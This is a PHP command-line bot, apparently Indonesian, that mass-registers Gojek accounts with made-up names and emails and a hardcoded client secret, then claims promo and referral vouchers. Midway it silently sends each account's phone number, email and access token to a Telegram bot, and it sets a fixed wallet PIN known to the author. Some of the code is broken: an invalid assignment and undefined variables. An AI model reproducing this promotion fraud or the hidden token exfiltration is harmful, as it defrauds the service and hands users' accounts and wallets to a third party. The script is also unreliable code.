<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo "\e[97m::::::::::::::::::::::::::::::::::::::::::::\n";
echo "\e[97m::::::::::::::\e[92mldkOKXXNNXXKOkdl\e[97m::::::::::::::\n";
echo "\e[97m:::::::::::\e[92md0NMMMMMMMMMMMMMMMMN0d\e[97m:::::::::::\n";
echo "\e[97m::::::::\e[92mcONMMMMMMMMMMMMMMMMMMMMMMNOc\e[97m::::::::\n";
echo "\e[97m::::::\e[92mcOWMMMMMMMMWX0OOOO0XWMMMMMMMMWOc\e[97m::::::\n";
echo "\e[97m:::::\e[92moNMMMMMMMXkl\e[97m::::::::::\e[92mlkXMMMMMMMNo\e[97m:::::\n";
echo "\e[97m::::\e[92moWMMMMMMXo\e[97m::::::\e[92mlool\e[97m::::::\e[92moXMMMMMMWo\e[97m::::\n";
echo "\e[97m:::\e[92mcNMMMMMM0\e[97m::::\e[92mcxKWMMMMWKxc\e[97m::::\e[92m0MMMMMMNc\e[97m:::\n";
echo "\e[97m:::\e[92mkMMMMMMX\e[97m::::\e[92mlXMMMMMMMMMMXl\e[97m::::\e[92mXMMMMMMk\e[97m:::\n";
echo "\e[97m:::\e[92mKMMMMMMx\e[97m::::\e[92mKMMMMMMMMMMMMK\e[97m::::\e[92mxMMMMMMK\e[97m:::\n";
echo "\e[97m:::\e[92mXMMMMMMd\e[97m::::\e[92mNMMMMMMMMMMMMNc\e[97m:::\e[92mdMMMMMMX\e[97m:::\n";
echo "\e[97m:::\e[92m0MMMMMMO\e[97m::::\e[92mkMMMMMMMMMMMMk\e[97m::::\e[92mOMMMMMM0\e[97m:::\n";
echo "\e[97m:::\e[92moMMMMMMWo\e[97m::::\e[92mxNMMMMMMMMNx\e[97m::::\e[92moWMMMMMMo\e[97m:::\n";
echo "\e[97m::::\e[92m0MMMMMMWd\e[97m:::::\e[92mok0KK0ko\e[97m:::::\e[92mdWMMMMMM0\e[97m::::\n";
echo "\e[97m::::\e[92mcKMMMMMMMKdc\e[97m::::::::::::\e[92mcdKMMMMMMMKc\e[97m::::\n";
echo "\e[97m::::::\e[92mxNMMMMMMMWKkl\e[97m::::::\e[92mlkKWMMMMMMMNx\e[97m::::::\n";
echo "\e[97m:::::::\e[92mcOWMMMMMMMMWx\e[97m::::\e[92mxWMMMMMMMMWOc\e[97m:::::::\n";
echo "\e[97m:::::::::\e[92mckXMMMMMMMx\e[97m::::\e[92mxMMMMMMMXkc\e[97m:::::::::\n";
echo "\e[97m::::::::::::\e[92mlxOKX0d\e[97m::::::\e[92md0XKOxl\e[97m::::::::::::\n";
echo "\e[97m::::::::::::::::::::::::::::::::::::::::::::\n";
echo color("green","▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
echo color("white","[•]  Time  : ".date("l, Y-m-d H:i:s")."   \n");
echo color("green","▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
echo color("white","[•]              Gondrong      \n");
echo color("green","▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","(•) Nomere Cok +62 : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("nevy","?] Otp: ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","+] Berhasil mendaftar");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("yellow","+] Your access token : ".$token."\n\n");
        save("token.txt",$token);
        echo "\n".color("nevy","?] Mau Redeem Voucher?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(REDEEM VOUCHER)===========");
        echo "\n".color("yellow","!] Claim voc GORIDE GOCAR");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(3);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOJEKINAJA"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        gocar:
        echo "\n".color("yellow","!] Claim voc GOFOOD");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(20);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"WEEKENDPAY"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        reff:
        $data = '{"referral_code":"GOJEKINAJA"}';    
        $claim = request("/customer_referrals/v1/campaign/enrolment", $token, $data);
        $message = fetch_value($claim,'"message":"','"');
        if(strpos($claim, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        }
        gofood:
        echo "\n".color("yellow","!] Subscribe Afri's Tutorial");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(3);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOJEKHEMAT"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        sleep(1);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        echo "\n".color("yellow","!] Total voucher ".$total." : ");
        echo color("green","1. ".$voucher1);
        echo "\n".color("green","                     2. ".$voucher2);
        echo "\n".color("green","                     3. ".$voucher3);
        echo "\n".color("green","                     4. ".$voucher4);
        echo "\n".color("green","                     5. ".$voucher5);
        echo "\n".color("green","                     6. ".$voucher6);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         TOKEN  = ":";

						$chatid = "";

						$pesan 	= "Gojek Account Info\n\nNomor: ".$hp."\nNama: ".$nama."\nEmail: ".$email."@gmail.com\n\n".$token."\n\nTotalVoucher = ".$total."\n\n".$voucher1."\nExp:  ".$expired1."\n\n".$voucher2."\nExp: ".$expired2."\n\n".$voucher3."\nExp: ".$expired3."\n\n".$voucher4."\nExp: ".$expired4."\n\n".$voucher5."\nExp: ".$expired5."\n\n".$voucher6."\nExp: ".$expired6."\n\n".$voucher7."\nExp: ".$expired7."\n\n".$voucher8."\nExp: ".$expired8."\n\n".$voucher9."\nExp: ".$expired9."\n\n".$voucher10."\nExp: ".$expired10."\n\n".$voucher11."\nExp: ".$expired11."\n\n".$voucher12."\nExp: ".$expired12."\n\n".$voucher13."\nExp: ".$expired13."\n";

						$method	= "sendMessage";

						$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;

						$post = [

							'chat_id' => $chatid,

							'text' => $pesan

						];

						$header = [

						"X-Requested-With: XMLHttpRequest",

						"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 

								];

						$ch = curl_init();

						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

						curl_setopt($ch, CURLOPT_URL, $url);

						curl_setopt($ch, CURLOPT_HTTPHEADER, $header);

						curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   

						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

						$datas = curl_exec($ch);

						$error = curl_error($ch);

						$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

						curl_close($ch);

						$debug['text'] = $pesan;

						$debug['respon'] = json_decode($datas, true);

						setpin:

							echo "\n".color("white","Set PIN? (y/n): ");

							$pilih1 = trim(fgets(STDIN));

							if ($pilih1 == "y" || $pilih1 == "Y") {

							//if($pilih1 == "y" && strpos($no, "628")){

								echo color("white","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN MU = 048049 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";

								$data2 = '{"pin":"048049"}';

								$getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);

								echo "Otp pin: ";

								$otpsetpin = trim(fgets(STDIN));

								$verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);

								echo $verifotpsetpin;

							} else if ($pilih1 == "n" || $pilih1 == "N") {

								die();

							} else {

								echo color("white","-] GAGAL!!!\n");

							}

					}

				}

			} else {

				echo color("white","-] OTP SALAH");

				echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";

				echo color("white","!] INPUT ULANG..\n");

				goto otp;

			}

	} else {

		echo color("white","-] NOMOR SALAH");

		echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";

		echo color("white","!] MASUKKAN LAGI\n");

		goto ulang;

	}

//  }
